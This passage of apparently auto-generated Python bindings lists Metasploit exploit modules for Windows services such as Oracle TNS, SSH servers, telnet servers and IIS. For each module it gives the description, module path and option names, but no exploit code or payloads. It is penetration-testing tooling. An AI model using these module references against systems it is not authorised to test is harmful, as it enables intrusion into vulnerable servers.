        under the "NetShowServices" user account. Windows Media Services 4.1 ships
        with Windows 2000 Server, but is not installed by default.

        NOTE: This service does NOT restart automatically. Successful, as well as
        unsuccessful exploitation attempts will kill the service which prevents
        additional attempts.
      
		"""

		path = 'windows/mmsp/ms10_025_wmss_connect_funnel'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_telnet_goodtech_telnet(object):
		"""
		
          This module exploits a stack buffer overflow in GoodTech Systems Telnet Server
        versions prior to 5.0.7. By sending an overly long string, an attacker can
        overwrite the buffer and control program execution.
      
		"""

		path = 'windows/telnet/goodtech_telnet'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_telnet_gamsoft_telsrv_username(object):
		"""
		
          This module exploits a username sprintf stack buffer overflow in GAMSoft TelSrv 1.5.
        Other versions may also be affected. The service terminates after exploitation,
        so you only get one chance!
      
		"""

		path = 'windows/telnet/gamsoft_telsrv_username'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_oracle_tns_arguments(object):
		"""
		
          This module exploits a stack buffer overflow in Oracle 8i. When
        sending a specially crafted packet containing a overly long
        ARGUMENTS string to the TNS service, an attacker may be able
        to execute arbitrary code.
      
		"""

		path = 'windows/oracle/tns_arguments'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_oracle_tns_auth_sesskey(object):
		"""
		
        This module exploits a stack buffer overflow in Oracle. When
        sending a specially crafted packet containing a long AUTH_SESSKEY value
        to the TNS service, an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/oracle/tns_auth_sesskey'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'
			required_SID = 'SID'

	class windows_oracle_extjob(object):
		"""
		
          This module exploits the Oracle Job Scheduler to execute arbitrary commands. The Job
        Scheduler is implemented via the component extjob.exe which listens on a named pipe
        called "orcljsex<SID>" and execute arbitrary commands received over this channel via
        CreateProcess(). In order to connect to the Named Pipe remotely, SMB access is required.
        Note that the Job Scheduler is disabled in default installations.
      
		"""

		path = 'windows/oracle/extjob'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_FLAVOR = 'CMDSTAGER::FLAVOR'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'
			required_SID = 'SID'

	class windows_oracle_osb_ndmp_auth(object):
		"""
		
          The module exploits a stack buffer overflow in Oracle Secure Backup.
        When sending a specially crafted NDMP_CONNECT_CLIENT_AUTH packet,
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/oracle/osb_ndmp_auth'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_oracle_client_system_analyzer_upload(object):
		"""
		
          This module exploits an arbitrary file upload vulnerability on the Client
        Analyzer component as included in Oracle Database 11g, which allows remote
        attackers to upload and execute arbitrary code. This module has been tested
        successfully on Oracle Database 11g 11.2.0.1.0 on Windows 2003 SP2, where execution
        through the Windows Management Instrumentation service has been used.
      
		"""

		path = 'windows/oracle/client_system_analyzer_upload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			required_SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_DEPTH = 'DEPTH'

	class windows_oracle_tns_service_name(object):
		"""
		
          This module exploits a stack buffer overflow in Oracle. When
        sending a specially crafted packet containing a long SERVICE_NAME
        to the TNS service, an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/oracle/tns_service_name'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_vpn_safenet_ike_11(object):
		"""
		
          This module exploits a stack buffer overflow in Safenet SoftRemote IKE IreIKE.exe
        service. When sending a specially crafted udp packet to port 62514 an
        attacker may be able to execute arbitrary code. This module has
        been tested with Juniper NetScreen-Remote 10.8.0 (Build 20) using
        windows/meterpreter/reverse_ord_tcp payloads.
      
		"""

		path = 'windows/vpn/safenet_ike_11'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_ssh_freeftpd_key_exchange(object):
		"""
		
          This module exploits a simple stack buffer overflow in FreeFTPd 1.0.10
        This flaw is due to a buffer overflow error when handling a specially
        crafted key exchange algorithm string received from an SSH client.
        This module is based on MC's freesshd_key_exchange exploit.
      
		"""

		path = 'windows/ssh/freeftpd_key_exchange'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_ssh_securecrt_ssh1(object):
		"""
		
          This module exploits a buffer overflow in SecureCRT <= 4.0
        Beta 2. By sending a vulnerable client an overly long
        SSH1 protocol identifier string, it is possible to execute
        arbitrary code.

        This module has only been tested on SecureCRT 3.4.4.
      
		"""

		path = 'windows/ssh/securecrt_ssh1'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_ssh_freesshd_authbypass(object):
		"""
		
          This module exploits a vulnerability found in FreeSSHd <= 1.2.6 to bypass
        authentication. You just need the username (which defaults to root). The exploit
        has been tested with both password and public key authentication.
      
		"""

		path = 'windows/ssh/freesshd_authbypass'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_FLAVOR = 'CMDSTAGER::FLAVOR'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'
			USERNAME = 'USERNAME'
			required_USER_FILE = 'USER_FILE'

	class windows_ssh_putty_msg_debug(object):
		"""
		
        This module exploits a buffer overflow in the PuTTY SSH client that is
        triggered through a validation error in SSH.c. This vulnerability
        affects versions 0.53 and earlier.
      
		"""

		path = 'windows/ssh/putty_msg_debug'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_ssh_freesshd_key_exchange(object):
		"""
		
          This module exploits a simple stack buffer overflow in FreeSSHd 1.0.9.
        This flaw is due to a buffer overflow error when handling a specially
        crafted key exchange algorithm string received from an SSH client.
      
		"""

		path = 'windows/ssh/freesshd_key_exchange'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_ssh_sysax_ssh_username(object):
		"""
		
          This module exploits a vulnerability found in Sysax's SSH service.  By
        supplying a long username, the SSH server will copy that data on the stack
        without proper bounds checking, therefore allowing remote code execution
        under the context of the user.  Please note that previous versions
        (before 5.53) are also affected by this bug.
      
		"""

		path = 'windows/ssh/sysax_ssh_username'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_iis_ms02_065_msadc(object):
		"""
		
          This module can be used to execute arbitrary code on IIS servers
          that expose the /msadc/msadcs.dll Microsoft Data Access Components
          (MDAC) Remote Data Service (RDS) DataFactory service. The service is
          exploitable even when RDS is configured to deny remote connections
          (handsafe.reg). The service is vulnerable to a heap overflow where
          the RDS DataStub 'Content-Type' string is overly long. Microsoft Data
          Access Components (MDAC) 2.1 through 2.6 are known to be vulnerable.
      
		"""

		path = 'windows/iis/ms02_065_msadc'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_PATH = 'PATH'

	class windows_iis_msadc(object):
		"""
		
          This module can be used to execute arbitrary commands on IIS servers
          that expose the /msadc/msadcs.dll Microsoft Data Access Components
          (MDAC) Remote Data Service (RDS) DataFactory service using VbBusObj
          or AdvancedDataFactory to inject shell commands into Microsoft Access
          databases (MDBs), MSSQL databases and ODBC/JET Data Source Name (DSN).
          Based on the msadcs.pl v2 exploit by Rain.Forest.Puppy, which was actively
          used in the wild in the late Ninties. MDAC versions affected include MDAC
          1.5, 2.0, 2.0 SDK, 2.1 and systems with the MDAC Sample Pages for RDS
          installed, and NT4 Servers with the NT Option Pack installed or upgraded
          2000 systems often running IIS3/4/5 however some vulnerable installations
          can still be found on newer Windows operating systems. Note that newer
          releases of msadcs.dll can still be abused however by default remote
          connections to the RDS is denied. Consider using VERBOSE if you're unable
          to successfully execute a command, as the error messages are detailed
          and useful for debugging. Also set NAME to obtain the remote hostname,
          and METHOD to use the alternative VbBusObj technique.
      
		"""

		path = 'windows/iis/msadc'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_FLAVOR = 'CMDSTAGER::FLAVOR'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'
			required_PATH = 'PATH'
			required_METHOD = 'METHOD'
			required_NAME = 'NAME'
			required_DBHOST = 'DBHOST'
			required_DBNAME = 'DBNAME'
			required_DBUID = 'DBUID'
			DBPASSWORD = 'DBPASSWORD'

	class windows_iis_ms01_033_idq(object):
		"""
		
          This module exploits a stack buffer overflow in the IDQ ISAPI handler for
        Microsoft Index Server.
      
		"""

		path = 'windows/iis/ms01_033_idq'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_iis_ms01_026_dbldecode(object):
		"""
		
          This module will execute an arbitrary payload on a Microsoft IIS installation
        that is vulnerable to the CGI double-decode vulnerability of 2001.

        NOTE: This module will leave a metasploit payload in the IIS scripts directory.
      
		"""

		path = 'windows/iis/ms01_026_dbldecode'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
